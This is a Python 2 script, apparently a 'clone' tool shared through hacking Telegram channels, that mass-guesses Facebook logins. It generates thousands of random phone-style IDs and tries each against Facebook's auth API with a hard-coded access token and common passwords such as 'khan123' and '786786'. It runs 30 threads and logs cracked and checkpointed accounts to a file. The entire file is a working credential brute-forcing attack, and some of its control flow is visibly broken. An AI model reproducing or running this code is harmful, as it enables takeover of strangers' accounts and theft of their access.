import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

os.system('rm -rf .txt')
for n in range(5000):
    afg = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print afg
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')


try:
    import mechanize
except ImportError:
    os.system('pip2 install request')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [
    ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


#clone system

	

	
	
back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

#Logo
logo ="""
\033[1;97m    $$\      $$\  $$$$$$\  $$\   $$\ $$$$$$$\  
$$$\    $$$ |$$  __$$\ $$ |  $$ |$$  __$$\ 
$$$$\  $$$$ |$$ /  \__|$$ |  $$ |$$ |  $$ |
$$\$$\$$ $$ |\$$$$$$\  $$$$$$$$ |$$ |  $$ |
$$ \$$$  $$ | \____$$\ $$  __$$ |$$ |  $$ |
$$ |\$  /$$ |$$\   $$ |$$ |  $$ |$$ |  $$ |
$$ | \_/ $$ |\$$$$$$  |$$ |  $$ |$$$$$$$  |
\__|     \__| \______/ \__|  \__|\_______/ 
                                           
                                           
                                           
\033[1;97m--------------------------------------------------
\033[1;97m Code By     : Abdullah Furqani 

\033[1;97m Friends     : Khalid ,Danger ,Qani ,Matin ,Hemat

\033[1;97m Telegram CH : https://t.me/Furqan_Hacking

\033[1;97m TLEGRAM GP  : https://t.me/FurqanHacking_Group
\033[1;97m--------------------------------------------------
"""
#call menu
def Furqan():
	menu()


#menu option 

def menu():
    os.system('clear')
    print logo
    print '[1]Afghan Clone'
    print ''
    Select_menu()
    
#Select_menu

def Select_menu():
    Select =raw_input('(Choose Clone Methode):')
    if Select == '':
        print 'Fill Empty'
        Select_menu()
    elif Select == '1':
    	
        os.system('clear')
        print logo 
        print 'Choose Any Code: 88,77,99,00,ETC'
        print ''
        
        try:
            c = raw_input('Input code :')
            print '' 
            k = '07'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print 'File Empty'
            raw_input('Try ')
            Furqan()
        

    print('Cloning Is Start:(Wait For Fb ID)')
    print ''
    
    
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('Qasim')
        except OSError:

            pass
            
   
            
            
#clone Password
        
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print ' \x1b[1;92m(FURQANI_OK) ' + k + c + user + ' | ' + pass1
                okb = open('Qasim.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m(ABDULLAH_CP) ' + k + c + user + ' | ' + pass1
                cps = open('Qasim.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m(FURQANI_OK)' + k + c + user + ' | ' + pass2
                    okb = open('Qasim.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;91m(ABDULLAH_CP) ' + k + c + user + ' | ' + pass2
                    okb = open('Qasim.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'khan123'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m(FURQANI_OK) ' + k + c + user + ' | ' + pass3
                        okb = open('Qasim.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m(ABDULLAH_CP) ' + k + c + user + ' | ' + pass3
                        cps = open('Qasim.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'afghan123'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m(FURQANI_OK) ' + k + c + user + ' | ' + pass4
                            okb = open('Qasim.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;91m(ABDULLAH_CP) ' + k + c + user + ' | ' + pass4
                            cps = open('Qasim.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = 'afghanistan'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(FURQANI_OK) ' + k + c + user + ' | ' + pass5
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(ABDULLAH_CP) ' + k + c + user + ' | ' + pass5
                                cps = open('Qasim.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                             pass6 = '786786'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(FURQANI_OK) ' + k + c + user + ' | ' + pass6
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass6 + '\n')
                                okb.close()
                                oks.append(c + user + pass6 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(ABDULLAH_CP) ' + k + c + user + ' | ' + pass6
                                cps = open('Qasim.txt', 'a')
                                cps.write(k + c + user + pass6  + '\n')
                                cps.close()
                                cpb.append(c + user + pass6)
                            else:
                             pass7 = '100200'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(FURQANI_OK) ' + k + c + user + ' | ' + pass7
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass7 + '\n')
                                okb.close()
                                oks.append(c + user + pass7 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(ABDULLAH_CP) ' + k + c + user + ' | ' + pass7
                                cps = open('Qasim.txt', 'a')
                                cps.write(k + c + user + pass7  + '\n')
                                cps.close()
                                cpb.append(c + user + pass7)
                                
                                
        except:
            pass
        

#end Message
    p = ThreadPool(30)
    p.map(main, id)
    print 'Clone Completed'
    print 'Note : Cp accounts Will Open after 10/12 days'
    print ''
    raw_input('enter to back')
    menu()

if __name__ == '__main__':
    menu()

